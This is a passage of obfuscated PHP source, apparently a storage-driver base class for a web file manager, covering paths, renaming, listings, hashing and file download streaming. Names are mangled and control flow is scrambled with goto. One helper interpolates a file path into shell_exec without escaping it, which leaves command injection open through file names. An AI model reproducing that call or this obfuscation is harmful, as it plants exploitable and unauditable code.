cã¤º®¥ÇÁ: $bİ‹¾ÚŸˆ¨ =& $_SERVER[Š‰]; if (!$CÍì¬¦´ || !function_exists($bİ‹¾ÚŸˆ¨[65])) { return $CÍì¬¦´; } static $D÷ô˜Ã¾Ñ = array(); goto D„¦İ‰ŸÅÁ; dµøìÜˆÛ: } public function getPathInner($bĞÑïÌœ¹Œ) { $f· „³Êéº = IO::init($bĞÑïÌœ¹Œ); return $f· „³Êéº->path; } public function getPathOuter($fˆ”ò‡È‹Œ) { $B°éŒ–¬º =& $_SERVER[Š‰]; $d®ÉÊä¹â = strlen(trim($this->pathBase, $B°éŒ–¬º[8])); $fˆ”ò‡È‹Œ = substr(trim($fˆ”ò‡È‹Œ, $B°éŒ–¬º[8]), $d®ÉÊä¹â); return $this->pathDriver . $B°éŒ–¬º[8] . ltrim($fˆ”ò‡È‹Œ, $B°éŒ–¬º[8]); } public function isParentOf($Aèº•À¾Ûâ, $dŸè¸‡Ï×á) { $BŠİ´äèŞï =& $_SERVER[Š‰]; $Aèº•À¾Ûâ = rtrim(strtolower($Aèº•À¾Ûâ), $BŠİ´äèŞï[8]) . $BŠİ´äèŞï[8]; $dŸè¸‡Ï×á = rtrim(strtolower($dŸè¸‡Ï×á), $BŠİ´äèŞï[8]) . $BŠİ´äèŞï[8]; $e‹ôñîÊ£÷ = strpos($dŸè¸‡Ï×á, $Aèº•À¾Ûâ) === 0; return $e‹ôñîÊ£÷; } public function getType() { $e¦‰Ü¿´·Æ =& $_SERVER[Š‰]; $FˆáÄŸ©ğâ = str_replace($e¦‰Ü¿´·Æ[71], $e¦‰Ü¿´·Æ[33], get_class($this)); return strtolower($FˆáÄŸ©ğâ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($F³‡÷Ö…ŠÅ, $fÖÅë’íÂ) { $c‡ì¯ï¢‘— =& $_SERVER[Š‰]; $DÊ¿ô­Œ¢ì = rtrim($F³‡÷Ö…ŠÅ, $c‡ì¯ï¢‘—[8]) . $c‡ì¯ï¢‘—[8] . $fÖÅë’íÂ; $CÌÕ÷ª¹šÖ = $this->exist($DÊ¿ô­Œ¢ì); return $CÌÕ÷ª¹šÖ ? $DÊ¿ô­Œ¢ì : !1; } public function setModifyTime($c÷ë±åœÙÜ, $A°²İ”ù°ì = '') { } public function renameObject($EØ©ë³‡óğ, $eˆÑ›æ•™Õ) { goto FñƒÁÈ‹‘÷; e´ÌŒŠî ©: return $bÒé×ÍŒ¨¡ ? $eˆÑ›æ•™Õ : !1; goto e¾Æ•²ƒ®³; FñƒÁÈ‹‘÷: $B»œæîĞÄ’ =& $_SERVER[Š‰]; $cä¥Íê¤Ş = $eˆÑ›æ•™Õ; Hook::trigger($B»œæîĞÄ’[72], $this, $EØ©ë³‡óğ, $this, $this->pathFather($EØ©ë³‡óğ) . $eˆÑ›æ•™Õ); goto e¤Èºã†´¿; e¤Èºã†´¿: $EØ©ë³‡óğ = $this->getPathOuter($EØ©ë³‡óğ); $eˆÑ›æ•™Õ = $this->pathFather($EØ©ë³‡óğ) . $eˆÑ›æ•™Õ; if (IO::isFile($EØ©ë³‡óğ)) { $bÒé×ÍŒ¨¡ = IO::copy($EØ©ë³‡óğ, $this->pathFather($EØ©ë³‡óğ), REPEAT_RENAME_FOLDER, $cä¥Íê¤Ş); if ($bÒé×ÍŒ¨¡) { IO::remove($EØ©ë³‡óğ); } } else { $bÒé×ÍŒ¨¡ = IO::mkdir($eˆÑ›æ•™Õ); if (!$bÒé×ÍŒ¨¡) { return !1; } $FµŠÖá§Õ = IO::listPath($EØ©ë³‡óğ, !0); $E×§¾ëŒ± = array_merge($FµŠÖá§Õ[$B»œæîĞÄ’[73]], $FµŠÖá§Õ[$B»œæîĞÄ’[74]]); foreach ($E×§¾ëŒ± as $bÄˆÒñå†Ş) { IO::move($bÄˆÒñå†Ş[$B»œæîĞÄ’[75]], $eˆÑ›æ•™Õ, REPEAT_RENAME_FOLDER); } IO::remove($EØ©ë³‡óğ); } goto e´ÌŒŠî ©; e¾Æ•²ƒ®³: } public function tempFile($DÌÍ®¿÷³˜ = '', $FÙ„“§­°° = '') { goto B¶îë¯–…; eíŸÙ’¨¾Ô: $A¼­÷êÌé = $Añ½âÂ¤ä¸ . $DÌÍ®¿÷³˜; @touch($A¼­÷êÌé); if ($FÙ„“§­°°) { file_put_contents($A¼­÷êÌé, $FÙ„“§­°°); } goto a´ìÜÜÌ¤ô; a´ìÜÜÌ¤ô: return $A¼­÷êÌé; goto Däƒî—Êœ¨; B¶îë¯–…: if (!$DÌÍ®¿÷³˜) { $DÌÍ®¿÷³˜ = rand_string(15); } $Añ½âÂ¤ä¸ = TEMP_FILES . rand_string(15) . $_SERVER[Š‰][8]; @mkdir($Añ½âÂ¤ä¸, 511, !0); goto eíŸÙ’¨¾Ô; Däƒî—Êœ¨: } public function tempFileRemve($b×â œ¿ò) { @unlink($b×â œ¿ò); @rmdir($this->pathFather($b×â œ¿ò)); } public function mkfile($b¬øãìƒòµ, $d‚¦ä»ì = '', $A‰İØ±ï‰° = REPEAT_RENAME) { } public function mkdir($F–òëŸ‚„, $Aá¶í­£¡ = REPEAT_SKIP) { } public function delFile($açÛªìôÕ¸) { } public function delFolder($A«¹Ó›ŠÎ´) { } public function copyFile($CÙèÛ¯ÎŒ, $BÁõ÷ÍÏµ—) { } public function moveFile($eò®Ô†ğ’Á, $bãáÚ‚ëµÈ) { } public function remove($fÁ‡ÉŠì) { if ($this->isFile($fÁ‡ÉŠì)) { return $this->delFile($fÁ‡ÉŠì); } return $this->delFolder($fÁ‡ÉŠì); } public function rename($BæÖ…ÄĞÀà, $BƒÇó¬·) { } public function exist($Fõ¥Äî“³õ) { } public function findByHash($d¥áø—çÁ = '', $eÕœ§÷ªğ = '') { return !1; } public function isFile($fœ…Š¯‘¸”) { } public function isFolder($fƒÑìó½·•) { } public function size($BÆ‘°éƒ¦Ñ) { } public function info($CÁ«ó¥ ‰í) { } public function infoSimple($FÏ°¦˜¡İ) { return $this->info($FÏ°¦˜¡İ); } public function infoAuth($dÄÒøÚŠô) { return $this->info($dÄÒøÚŠô); } public function infoFull($bÓÔšÓßš) { return $this->info($bÓÔšÓßš); } public function infoWithChildren($c´àè††) { $c‰Å÷êËºË =& $_SERVER[Š‰]; static $câáÒÓ–å¤ = array(); if (isset($câáÒÓ–å¤[$c´àè††])) { return $câáÒÓ–å¤[$c´àè††]; } $F¾™ŸÍÑ¹Ë = $this->info($c´àè††); if ($F¾™ŸÍÑ¹Ë && $F¾™ŸÍÑ¹Ë[$c‰Å÷êËºË[29]] == $c‰Å÷êËºË[76]) { $c¯Ë°Ş¶¢ = array($c‰Å÷êËºË[77] => 0, $c‰Å÷êËºË[78] => 0, $c‰Å÷êËºË[79] => 0); $this->infoChildren($c´àè††, $c¯Ë°Ş¶¢); $F¾™ŸÍÑ¹Ë[$c‰Å÷êËºË[77]] = $c¯Ë°Ş¶¢[$c‰Å÷êËºË[77]]; $F¾™ŸÍÑ¹Ë[$c‰Å÷êËºË[80]] = array($c‰Å÷êËºË[81] => $c¯Ë°Ş¶¢[$c‰Å÷êËºË[78]], $c‰Å÷êËºË[82] => $c¯Ë°Ş¶¢[$c‰Å÷êËºË[79]]); $câáÒÓ–å¤[$c´àè††] = $F¾™ŸÍÑ¹Ë; } return $F¾™ŸÍÑ¹Ë; } public function listPath($e›ÚñÁÊ¦‹, $bª’‰™—¥¡ = false) { } public function has($a‡ìÁªÑ, $C ôï…Î«š = false, $C‹õ¢ï£• = false) { } public function canRead($e„‘ÙÄŞ™) { } public function canWrite($E‰ÖÙöÛ¿ˆ) { } public function getContent($EôÀŸè¹Ÿ…) { } public function setContent($Bò“ë’ÙãÛ, $D§’µ§èØÁ = '') { } protected function infoChildren($Aöé•ƒ×¶×, &$döÊˆÇ¸áÊ) { $FÃİµšÎ‚Ø =& $_SERVER[Š‰]; check_abort_echo(); $dêëËÈŞ† = $this->listPath($Aöé•ƒ×¶×, !0); $dêëËÈŞ† = array_merge($dêëËÈŞ†[$FÃİµšÎ‚Ø[74]], $dêëËÈŞ†[$FÃİµšÎ‚Ø[73]]); foreach ($dêëËÈŞ† as $DåØ¦—õó) { if ($DåØ¦—õó[$FÃİµšÎ‚Ø[29]] == $FÃİµšÎ‚Ø[76]) { $döÊˆÇ¸áÊ[$FÃİµšÎ‚Ø[79]]++; $Bâåæ‡Ùêå = $this->getPathInner($DåØ¦—õó[$FÃİµšÎ‚Ø[75]]); $this->infoChildren($Bâåæ‡Ùêå, $döÊˆÇ¸áÊ); } else { $döÊˆÇ¸áÊ[$FÃİµšÎ‚Ø[78]]++; $döÊˆÇ¸áÊ[$FÃİµšÎ‚Ø[77]] += $DåØ¦—õó[$FÃİµšÎ‚Ø[77]]; } } } public function fileSubstr($f«£ñÉ°, $aì¸Ü®ÒÕ, $D©®Ï‰ÖÚ‡) { } public function listAll($B†ŠİŸ‰òŸ) { } public function listAllMake($DéÅ£×îÚ, &$FÎÌµÔ‰–¨) { $eê»Å—¹Õ¡ =& $_SERVER[Š‰]; check_abort_echo(); $Dª¬‹°š¯ = $this->listPath($DéÅ£×îÚ, !0); if (!$Dª¬‹°š¯) { return; } $eÇÙ‚ğéÉ… = array_merge($Dª¬‹°š¯[$eê»Å—¹Õ¡[74]], $Dª¬‹°š¯[$eê»Å—¹Õ¡[73]]); foreach ($eÇÙ‚ğéÉ… as $BÙ¬Œ‹§˜ˆ) { goto f‘ì‡ÃóË; f‘ì‡ÃóË: $e³å½”‡İé = $BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[29]] == $eê»Å—¹Õ¡[76]; $bÎ³Ÿ©áÃ = array($eê»Å—¹Õ¡[75] => $BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[75]], $eê»Å—¹Õ¡[76] => $e³å½”‡İé); if (isset($BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[77]])) { $bÎ³Ÿ©áÃ[$eê»Å—¹Õ¡[77]] = $BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[77]]; } goto Cƒ¨¸²˜´ˆ; Cƒ¨¸²˜´ˆ: if (isset($BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[83]])) { $bÎ³Ÿ©áÃ[$eê»Å—¹Õ¡[83]] = $BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[83]]; } if (!$e³å½”‡İé) { $FÎÌµÔ‰–¨[] = $bÎ³Ÿ©áÃ; continue; } $FÎÌµÔ‰–¨[] = $bÎ³Ÿ©áÃ; goto Eù»·§¡®; Eù»·§¡®: $this->listAllMake($BÙ¬Œ‹§˜ˆ[$eê»Å—¹Õ¡[75]], $FÎÌµÔ‰–¨); goto bŞ¯Ò‚‡¿Ä; bŞ¯Ò‚‡¿Ä: } } public function listAllSimple($dÛ×‘‹³ø) { $fŸÅˆ•¾ÔÒ =& $_SERVER[Š‰]; $F¿ÃÛ•ÂàÑ = array(); $e»°›Øğ£ = $this->listAll($dÛ×‘‹³ø); $A™ãË”ß = $this->getPathOuter($dÛ×‘‹³ø); foreach ($e»°›Øğ£ as $f™á®º“²½) { goto Cƒ‹­æòÓ¾; A †—™¦ª: $FÛºğÎÛÕò = array($fŸÅˆ•¾ÔÒ[75] => $e›£”°“´½, $fŸÅˆ•¾ÔÒ[76] => $f™á®º“²½[$fŸÅˆ•¾ÔÒ[76]]); if (isset($f™á®º“²½[$fŸÅˆ•¾ÔÒ[77]]) && !$f™á®º“²½[$fŸÅˆ•¾ÔÒ[76]]) { $FÛºğÎÛÕò[$fŸÅˆ•¾ÔÒ[77]] = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[77]]; } if (isset($f™á®º“²½[$fŸÅˆ•¾ÔÒ[83]])) { $FÛºğÎÛÕò[$fŸÅˆ•¾ÔÒ[83]] = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[83]]; } goto d„¼äš˜À; d„¼äš˜À: if (!$f™á®º“²½[$fŸÅˆ•¾ÔÒ[76]]) { $FÛºğÎÛÕò[$fŸÅˆ•¾ÔÒ[85]] = $E²†Å¼µĞ; } $F¿ÃÛ•ÂàÑ[] = $FÛºğÎÛÕò; goto CÑÔôè¾Ø¤; Cƒ‹­æòÓ¾: $E²†Å¼µĞ = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[75]]; $e›£”°“´½ = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[75]]; if (isset($f™á®º“²½[$fŸÅˆ•¾ÔÒ[84]])) { $E²†Å¼µĞ = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[84]][$fŸÅˆ•¾ÔÒ[75]]; $f™á®º“²½[$fŸÅˆ•¾ÔÒ[77]] = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[84]][$fŸÅˆ•¾ÔÒ[77]]; $f™á®º“²½[$fŸÅˆ•¾ÔÒ[83]] = $f™á®º“²½[$fŸÅˆ•¾ÔÒ[84]][$fŸÅˆ•¾ÔÒ[83]]; } else { $e›£”°“´½ = substr($f™á®º“²½[$fŸÅˆ•¾ÔÒ[75]], strlen(get_path_father($A™ãË”ß))); $e›£”°“´½ = $fŸÅˆ•¾ÔÒ[8] . ltrim($e›£”°“´½, $fŸÅˆ•¾ÔÒ[8]); } goto A †—™¦ª; CÑÔôè¾Ø¤: } return $F¿ÃÛ•ÂàÑ; } public function upload($F‡µ‚Á¨Ø„, $Có¬Ã™¬, $D®«êïé® = false, $F÷®øÀ·¶” = REPEAT_REPLACE) { } public function uploadFileByID($bë¾åöÌè, $bÁÉÜ„”ÒÚ, $dß´Óñ¸Òõ) { } public function uploadFileByPath($F›®ŞŒö×, $c«¬Óô¬Ê¯, $B­…ƒ‹Å¥¤ = array()) { } public function isUploadServer() { $FœÏáÁåè« =& $_SERVER[Š‰]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $FœÏáÁåè«[86]) { return !0; } return $GLOBALS[$FœÏáÁåè«[6]][$FœÏáÁåè«[87]][$FœÏáÁåè«[88]]; } public function isFileOutServer() { $CîèäìáĞ™ =& $_SERVER[Š‰]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CîèäìáĞ™[86]) { return !0; } return $GLOBALS[$CîèäìáĞ™[6]][$CîèäìáĞ™[87]][$CîèäìáĞ™[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($fÖˆÏà³ƒ) { $fËùÆ÷Î =& $_SERVER[Š‰]; if (!$this->isCdnHost()) { return $fÖˆÏà³ƒ; } return str_replace(trim(get_url_root($fÖˆÏà³ƒ), $fËùÆ÷Î[8]), trim($this->cdnHost, $fËùÆ÷Î[8]), $fÖˆÏà³ƒ); } public function uploadLink($bÃª‘îìß­, $bõğª‡Ø­ = 0) { goto DÔğêµ¯İÍ; DÔğêµ¯İÍ: $e”‚»ã¡¾ =& $_SERVER[Š‰]; if ($this->isUploadServer()) { return; } $bé­Í¬õ¤Œ = $this->getType(); goto E·—‡Êƒ®³; E¦õº²£‡ƒ: $Dƒ¤îåğ… = $bõğª‡Ø­ <= $fÎØÊÓŒÓ‡ ? $e”‚»ã¡¾[90] : $e”‚»ã¡¾[91]; $D¾’àÖ„É = (!$bõğª‡Ø­ ? 1 : ceil($bõğª‡Ø­ / pow(1024, 3))) * 3600 * 4; $F‡­ßŞïğÃ = $this->{$Dƒ¤îåğ…}($bÃª‘îìß­, $D¾’àÖ„É); goto FÈçŠî¹¤æ; E·—‡Êƒ®³: if (!in_array($bé­Í¬õ¤Œ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $fÎØÊÓŒÓ‡ = 1024 * 1024 * 10; goto E¦õº²£‡ƒ; FÈçŠî¹¤æ: if ($F‡­ßŞïğÃ) { $F‡­ßŞïğÃ[$e”‚»ã¡¾[92]] = $bÃª‘îìß­; $F‡­ßŞïğÃ[$e”‚»ã¡¾[93]] = $bé­Í¬õ¤Œ; } return $F‡­ßŞïğÃ; goto BÌ«”š‡¹Š; BÌ«”š‡¹Š: } public function uploadFormData($c«Çº¢Å£, $EÏÛÁ‘¯¬ñ = 3600) { } public function multiUploadFormData($aª°®Æğ½, $Dö†ÛÄ–¼ = 3600) { } public function download($C†¬òöê»×, $F™İĞÅƒÓø) { } public function ext($CÖÄ “ñï‚) { $fÛç‰¥íİâ =& $_SERVER[Š‰]; if (strpos($CÖÄ “ñï‚, $fÛç‰¥íİâ[8]) === -1) { $e íâ‹¦ƒê = $CÖÄ “ñï‚; } else { $e íâ‹¦ƒê = $this->pathThis($CÖÄ “ñï‚); } $f¼—ãÔŠè = $fÛç‰¥íİâ[33]; if (strstr($e íâ‹¦ƒê, $fÛç‰¥íİâ[94])) { $f¼—ãÔŠè = substr($e íâ‹¦ƒê, strrpos($e íâ‹¦ƒê, $fÛç‰¥íİâ[94]) + 1); $f¼—ãÔŠè = strtolower($f¼—ãÔŠè); } if (strlen($f¼—ãÔŠè) > 3 && preg_match($fÛç‰¥íİâ[95], $f¼—ãÔŠè, $déĞÓ×æ°«)) { $f¼—ãÔŠè = $fÛç‰¥íİâ[33]; } return $f¼—ãÔŠè; } public function pathThis($b±À›Šî•–) { $EØŸÒíÔƒ =& $_SERVER[Š‰]; $b±À›Šî•– = str_replace($EØŸÒíÔƒ[96], $EØŸÒíÔƒ[8], rtrim($b±À›Šî•–, $EØŸÒíÔƒ[8])); $c¼º­¹  = strrpos($b±À›Šî•–, $EØŸÒíÔƒ[8]); if ($c¼º­¹  === !1) { return $b±À›Šî•–; } return substr($b±À›Šî•–, $c¼º­¹  + 1); } public function pathFather($CµÊ¡ôˆó¦) { $fµİø¾Ú¿é =& $_SERVER[Š‰]; $CµÊ¡ôˆó¦ = str_replace($fµİø¾Ú¿é[96], $fµİø¾Ú¿é[8], rtrim($CµÊ¡ôˆó¦, $fµİø¾Ú¿é[8])); $Bâß§ò†† = strrpos($CµÊ¡ôˆó¦, $fµİø¾Ú¿é[8]); if ($Bâß§ò†† === !1) { return $fµİø¾Ú¿é[33]; } return substr($CµÊ¡ôˆó¦, 0, $Bâß§ò†† + 1); } public function hashSimple($CãÊ°‚éˆ­) { goto c„Ä­ëê˜; d½Øâò‘µÚ: $fë«ØÎ­ = 200; $D£áëÔíÚ = 50; if ($a‘È¯–ƒ…Å <= $fë«ØÎ­ * $D£áëÔíÚ) { return $this->hashMd5($CãÊ°‚éˆ­) . $a‘È¯–ƒ…Å; } goto Cñõå›¨±; dˆ§ÂÄ´ƒñ: $A½¹ì¢òÂ° .= $this->fileSubstr($CãÊ°‚éˆ­, $a‘È¯–ƒ…Å - $fë«ØÎ­, $fë«ØÎ­); return md5($A½¹ì¢òÂ°) . $a‘È¯–ƒ…Å; goto E‹‘ãìŠ¢À; c„Ä­ëê˜: $cé¬”ÖÉ =& $_SERVER[Š‰]; if (!$CãÊ°‚éˆ­) { return md5($cé¬”ÖÉ[33]); } $a‘È¯–ƒ…Å = $this->size($CãÊ°‚éˆ­); goto d½Øâò‘µÚ; Cñõå›¨±: $F¸¬…º¿¢Ô = intval($a‘È¯–ƒ…Å / $D£áëÔíÚ); $A½¹ì¢òÂ° = $cé¬”ÖÉ[33]; for ($DšøŠ†«ƒ§ = 0; $DšøŠ†«ƒ§ < $D£áëÔíÚ; $DšøŠ†«ƒ§++) { $A½¹ì¢òÂ° .= $this->fileSubstr($CãÊ°‚éˆ­, $F¸¬…º¿¢Ô * $DšøŠ†«ƒ§, $fë«ØÎ­); } goto dˆ§ÂÄ´ƒñ; E‹‘ãìŠ¢À: } public static $md5Cache = array(); public function hashMd5($DŠÜ½¦ŸÚ) { $DŠÜ½¦ŸÚ = $this->iconvSystem($DŠÜ½¦ŸÚ); if (isset(self::$md5Cache[$DŠÜ½¦ŸÚ])) { return self::$md5Cache[$DŠÜ½¦ŸÚ]; } self::$md5Cache[$DŠÜ½¦ŸÚ] = $this->hashMd5Shell($DŠÜ½¦ŸÚ); if (!self::$md5Cache[$DŠÜ½¦ŸÚ]) { self::$md5Cache[$DŠÜ½¦ŸÚ] = @md5_file($DŠÜ½¦ŸÚ); } return self::$md5Cache[$DŠÜ½¦ŸÚ]; } private function hashMd5Shell($føßØçÁİâ) { goto CÈĞğºĞÇÄ; bàğ§¬éßã: $EêîÜ‡ï = shell_exec($CÂó½…‹âİ . "\x20\x22{$føßØçÁİâ}\42"); $EêîÜ‡ï = str_replace($CÉ¡Íò­Æ[103], $CÉ¡Íò­Æ[33], $EêîÜ‡ï); return substr($EêîÜ‡ï, 0, 32); goto CâÈ¥Áºšö; CÈĞğºĞÇÄ: $CÉ¡Íò­Æ =& $_SERVER[Š‰]; if (!function_exists($CÉ¡Íò­Æ[97])) { return !1; } $C‚ª¦‡‘ó = array($CÉ¡Íò­Æ[98], $CÉ¡Íò­Æ[99]); goto D¸‹ØŒ¾øŠ; D¸‹ØŒ¾øŠ: $CÂó½…‹âİ = Cache::get($CÉ¡Íò­Æ[100]); if (!$CÂó½…‹âİ) { $f•ÊÉìÑ¸“ = BASIC_PATH . $CÉ¡Íò­Æ[101]; $EÈöò®µç¶ = md5_file($f•ÊÉìÑ¸“); $CÂó½…‹âİ = $CÉ¡Íò­Æ[102]; foreach ($C‚ª¦‡‘ó as $a”Ó»Ëà¯á) { $EêîÜ‡ï = shell_exec($a”Ó»Ëà¯á . "\40\x22{$f•ÊÉìÑ¸“}\x22"); if ($EêîÜ‡ï && substr(trim($EêîÜ‡ï), 0, 32) == $EÈöò®µç¶) { $CÂó½…‹âİ = $a”Ó»Ëà¯á; break; } } Cache::set($CÉ¡Íò­Æ[100], $CÂó½…‹âİ, 3600); } if ($CÂó½…‹âİ == $CÉ¡Íò­Æ[102]) { return !1; } goto bàğ§¬éßã; CâÈ¥Áºšö: } public function link($Fê£ó×ïˆ‘) { return $Fê£ó×ïˆ‘; } public function fileOut($c«ºÌÁçİÕ, $FÎ®¶¿‰›Š = false, $DÇÀˆ§‚ã = false, $Bö¼ËØ°œ§ = '') { goto d•›¯“Â»÷; EŠ•ŞÒ¿: header($D±—¥ªÅ¶[134] . $dˆ¼Ã˜…ô . $D±—¥ªÅ¶[126]); header($D±—¥ªÅ¶[135] . $eÒ—‚¤¿¥’); header($D±—¥ªÅ¶[136]); goto b÷Ÿ‹‹´­…; f¥Îõ¦‹Ğ•: if (in_array($A”Ãß¿¢Î, array($D±—¥ªÅ¶[110], $D±—¥ªÅ¶[111], $D±—¥ªÅ¶[112], $D±—¥ªÅ¶[113]))) { $A”Ãß¿¢Î = $D±—¥ªÅ¶[114]; } if (!$Bö¼ËØ°œ§) { $Bö¼ËØ°œ§ = md5($dˆ¼Ã˜…ô . $this->hashSimple($c«ºÌÁçİÕ)); } $Bö¼ËØ°œ§ = $D±—¥ªÅ¶[115] . $Bö¼ËØ°œ§ . $D±—¥ªÅ¶[115]; goto DõÌ¸ô¼ª; DõÌ¸ô¼ª: $E†…£ŞÇ—ğ = get_file_mime($A”Ãß¿¢Î); if (strstr($E†…£ŞÇ—ğ, $D±—¥ªÅ¶[116])) { $E†…£ŞÇ—ğ = $E†…£ŞÇ—ğ . $D±—¥ªÅ¶[117]; } if ($FÎ®¶¿‰›Š === !1 && !mime_support($E†…£ŞÇ—ğ)) { $FÎ®¶¿‰›Š = !0; $E†…£ŞÇ—ğ = $D±—¥ªÅ¶[118]; } goto fˆªæÓß; eèà”°ÒÖİ: $E·±£’ÊÄ® = strtolower($_SERVER[$D±—¥ªÅ¶[141]]); if ($f‰×¹÷ª && $E·±£’ÊÄ® && $C‹ô¹Ø÷ò) { if (strstr($E·±£’ÊÄ®, $D±—¥ªÅ¶[142])) { header($D±—¥ªÅ¶[143] . $c«ºÌÁçİÕ); } else { if (strstr($E·±£’ÊÄ®, $D±—¥ªÅ¶[144])) { header($D±—¥ªÅ¶[145] . $c«ºÌÁçİÕ); } else { if (strstr($E·±£’ÊÄ®, $D±—¥ªÅ¶[146])) { header($D±—¥ªÅ¶[147] . $c«ºÌÁçİÕ); } } } if ($Dòë¢‘íà¹) { header($D±—¥ªÅ¶[148] . $Dòë¢‘íà¹); } return; } if (isset($_SERVER[$D±—¥ªÅ¶[149]])) { if (preg_match($D±—¥ªÅ¶[150], $_SERVER[$D±—¥ªÅ¶[149]], $E¥‰®ÉÖŒ)) { $C¨÷çŞœĞ = intval($E¥‰®ÉÖŒ[1]); if (!empty($E¥‰®ÉÖŒ[2])) { $cä‰§™¤¢ = intval($E¥‰®ÉÖŒ[2]); } } header($D±—¥ªÅ¶[151]); header("\x43\x6f\156\x74\x65\156\x74\55\x52\x61\156\x67\x65\72\x20\142\x79\164\x65\163\40{$C¨÷çŞœĞ}\x2d{$cä‰§™¤¢}\57" . $d¹áßŒà»Å); } else { header($D±—¥ªÅ¶[152]); } goto E’†ª‰¯ç‰; b»‘µÕåŸÊ: if ($_SERVER[$D±—¥ªÅ¶[156]] == $D±—¥ªÅ¶[157]) { return; } $AíŒôÌ‘¼ = 1024 * 100; $D¹Á§‘ƒÑ• = 0; goto D–Çì¾•º¦; B²ñ‘ĞŠÛ: @ob_end_clean(); set_timeout(); $CÒĞ¼©é¶» = $this->infoFull($c«ºÌÁçİÕ); goto dåøµšïœ; b÷Ÿ‹‹´­…: header($D±—¥ªÅ¶[137] . $d¹áßŒà»Å); header($D±—¥ªÅ¶[138]); if (!$FÎ®¶¿‰›Š && $A”Ãß¿¢Î == $D±—¥ªÅ¶[139]) { if ($d¹áßŒà»Å > 1024 * 1024 * 5) { die; } $Eø•‰šğ¦ = $this->getContent($c«ºÌÁçİÕ); $Eø•‰šğ¦ = Html::clearSVG($Eø•‰šğ¦); header($D±—¥ªÅ¶[140] . strlen($Eø•‰šğ¦)); echo $Eø•‰šğ¦; die; } goto eèà”°ÒÖİ; D–Çì¾•º¦: if ($Dòë¢‘íà¹) { $D¹Á§‘ƒÑ• = intval(1000 * 1000 * ($AíŒôÌ‘¼ / $Dòë¢‘íà¹)); } while ($C¨÷çŞœĞ <= $cä‰§™¤¢) { $a…‡¾‡Î×¼ = timeFloat(); check_abort(); $fêÕçÑ‰¹Á = $cä‰§™¤¢ - $C¨÷çŞœĞ + 1; if ($fêÕçÑ‰¹Á <= $AíŒôÌ‘¼) { $AíŒôÌ‘¼ = $fêÕçÑ‰¹Á; } echo $this->fileSubstr($c«ºÌÁçİÕ, $C¨÷çŞœĞ, $AíŒôÌ‘¼); $C¨÷çŞœĞ += $AíŒôÌ‘¼; if ($AíŒôÌ‘¼ == $fêÕçÑ‰¹Á) { $C¨÷çŞœĞ = $cä‰§™¤¢ + 1; } if ($D¹Á§‘ƒÑ•) { $c­ãĞÎÌá = intval(1000 * 1000 * (timeFloat() - $a…‡¾‡Î×¼)); $bØºÊ¨ÛÓŸ = $D¹Á§‘ƒÑ• - $c­ãĞÎÌá; if ($bØºÊ¨ÛÓŸ > 5) { usleep($bØºÊ¨ÛÓŸ); } } } goto BêÍâÆé‚¸; c´‹Åå‘¦Ú: $C¨÷çŞœĞ = 0; $cä‰§™¤¢ = $d¹áßŒà»Å - 1; $A”Ãß¿¢Î = $this->ext($eÒ—‚¤¿¥’); goto f¥Îõ¦‹Ğ•; d•›¯“Â»÷: $D±—¥ªÅ¶ =& $_SERVER[Š‰]; $this->cacheMethod(null, null); if (!$c«ºÌÁçİÕ || !$this->exist($c«ºÌÁçİÕ)) { show_json(LNG($D±—¥ªÅ¶[104]), !1, $DÇÀˆ§‚ã); } goto A„»ÏÁ ™¡; cîÅÍä–ŠŞ: if (isset($_SERVER[$D±—¥ªÅ¶[130]]) && strtotime($_SERVER[$D±—¥ªÅ¶[130]]) == $CÒĞ¼©é¶»[$D±—¥ªÅ¶[83]]) { header($D±—¥ªÅ¶[131], !0, 304); die; } if (isset($_SERVER[$D±—¥ªÅ¶[132]]) && $_SERVER[$D±—¥ªÅ¶[132]] == $Bö¼ËØ°œ§) { header($D±—¥ªÅ¶[133] . $Bö¼ËØ°œ§, !0, 304); die; } header($D±—¥ªÅ¶[133] . $Bö¼ËØ°œ§); goto EŠ•ŞÒ¿; fˆªæÓß: header($D±—¥ªÅ¶[119]); header($D±—¥ªÅ¶[120] . $E†…£ŞÇ—ğ); $FèÂÎÛÈ†· = rawurlencode($eÒ—‚¤¿¥’); goto FÔ„öó¡±; A„»ÏÁ ™¡: $f‰×¹÷ª = $this->getType() == $D±—¥ªÅ¶[105]; $C‹ô¹Ø÷ò = $GLOBALS[$D±—¥ªÅ¶[6]][$D±—¥ªÅ¶[87]][$D±—¥ªÅ¶[106]][$D±—¥ªÅ¶[107]]; $Dòë¢‘íà¹ = (double) $GLOBALS[$D±—¥ªÅ¶[6]][$D±—¥ªÅ¶[87]][$D±—¥ªÅ¶[106]][$D±—¥ªÅ¶[108]] * 1024 * 1024; goto B²ñ‘ĞŠÛ; E’†ª‰¯ç‰: $AÔ§Í¯Î– = !0; if ($_SERVER[$D±—¥ªÅ¶[153]] == $D±—¥ªÅ¶[154] && $d¹áßŒà»Å > 1204 * 1024 * 1024 * 2) { $AÔ§Í¯Î– = !1; } if ($AÔ§Í¯Î–) { header($D±—¥ªÅ¶[155] . ($cä‰§™¤¢ - $C¨÷çŞœĞ + 1)); } goto b»‘µÕåŸÊ; Cö“¾Àç¥ª: header($D±—¥ªÅ¶[127]); header($D±—¥ªÅ¶[128]); header($D±—¥ªÅ¶[129]); goto cîÅÍä–ŠŞ; FÔ„öó¡±: $FèÂÎÛÈ†· = $D±—¥ªÅ¶[115] . $FèÂÎÛÈ†· . $D±—¥ªÅ¶[121] . $FèÂÎÛÈ†·; if ($FÎ®¶¿‰›Š) { header($D±—¥ªÅ¶[122]); header($D±—¥ªÅ¶[123] . 